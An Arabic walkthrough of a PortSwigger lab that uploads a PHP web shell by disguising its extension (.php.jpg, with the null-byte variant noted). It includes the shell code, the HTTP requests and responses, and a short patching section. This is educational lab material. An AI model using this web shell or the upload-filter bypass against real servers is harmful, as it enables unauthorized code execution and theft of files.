# [Web shell upload via obfuscated file extension](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension)

## **`الهدف`**
قم برفع ملف `PHP Web Shell` بسيط واستخدمه لاستخراج محتويات ملف `/home/carlos/secret` ثم قم بتقديمه كـ `Solutiom`.
## **`خطوات الحل`**
سنقوم بتسجيل الدخول إلى حساب `wiener:peter` بعد ذلك سنقوم بعمل ملف نصي على الجهاز باستخدام أى برنامج تحرير نصوص ونضع بداخله الكود التالي ونقوم بحفظه بصيغة `php` وأى اسم عشوائي مثل `TESTTEST`:
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
بعد ذلك سنقوم برفعه باستخدام خاصية رفع الـ `Avatar` داخل اللاب.
ولكن سنلاحظ وجود رسالة خطأ في المتصفح والاستجابة
```http
HTTP/2 403 Forbidden
Date: Tue, 29 Sep 2026 18:52:54 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 171

Sorry, only JPG & PNG files are allowed
Sorry, there was an error uploading your file.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```
لذلك سنعود مرة أخرى ونقوم بتغيير اسم الملف وامتداده ليصبح `TESTEST.php.jpg`
وبعد ذلك سنقوم برفعه باستخدام خاصية رفع الـ `Avatar` داخل اللاب
وبمجرد اتمام الرفع وعمل تجديد لصفحة `My account` سنجد في الـ `HTTP history` الطلب التالي والذي يستدعي الملف تلقائيًا:
```http
GET /files/avatars/TESTTEST.php.jpg HTTP/2
Host: 0ab7002004280405801526a60095004a.web-security-academy.net
Cookie: session=a8qzBYXEjap7JtFT3Z2WS7KRiiZRYl2j
```
وبفحص الاستجابة سنجد أنه لا يوجد بداخلها الـ `Secret`، ولكن بدلًا من ذلك يوجد بداخلها نفس الأمر الذي قمنا بحقن في ملف الـ `PHP`
```http
HTTP/2 200 OK
Date: Tue, 29 Sep 2026 18:55:04 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Tue, 29 Sep 2026 18:54:53 GMT
Etag: "37-65ca3b7d34cf3"
Accept-Ranges: bytes
Content-Type: image/jpeg
X-Frame-Options: SAMEORIGIN
Content-Length: 55

<?php echo file_get_contents('/home/carlos/secret'); ?>
```
لذلك كل ماسنحتاج إلى فعله هو تغيير مسار طلب الرابط وحذف امتدادا `jpg` من ليصبح `GET /files/avatars/TESTTEST.php`
```http
GET /files/avatars/TESTTEST.php HTTP/2
Host: 0ab7002004280405801526a60095004a.web-security-academy.net
Cookie: session=a8qzBYXEjap7JtFT3Z2WS7KRiiZRYl2j
```
وبفحص الاستجابة سنجد بداخلها الـ `Secret` المطلوب
```http
HTTP/2 200 OK
Date: Tue, 29 Sep 2026 18:56:50 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 32

Xi1CqN9O2eO1E9q3Y5gagpELWpXX6YFT
```
بعد ذلك سنقوم بنسخه ثم نعود للصفحة الرئيسية للاب ونضغط على  `Submit solution` ونضعه في الحقل ونضغط `OK` لننتهي من حل اللاب.

**`ملاحظة هامة:`** هذا الحل مختلف عن الحل الرسمي في الـ `PortSwigger` واعتقد انه لم يكن من المفترض حدوثه، فالحل الرسمي يعتمد على تغيير الـ `filename` في طلب الـ `http` ليتم إضافة الـ `Null Bytes` ليصبح `TESTTEST.php%00.jpg` وبعد ذلك تقوم بعمل طلب لمسار  `GET /files/avatars/TESTTEST.php` والذي يبدو مضيعة للوقت فلا يوجد قيمة إضافية حدثت من إضافة الـ `Null Bytes` هنا، لذلك في الغالب هذا خطأ في إعدادات اللاب نفسها.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب` [Remote code execution via web shell upload](./Remote-code-execution-via-web-shell-upload.md)
ويجب ضبط السيرفر وتحديث إذا كان على إصدار قديم ليتجاهل الـ `Null Bytes`.
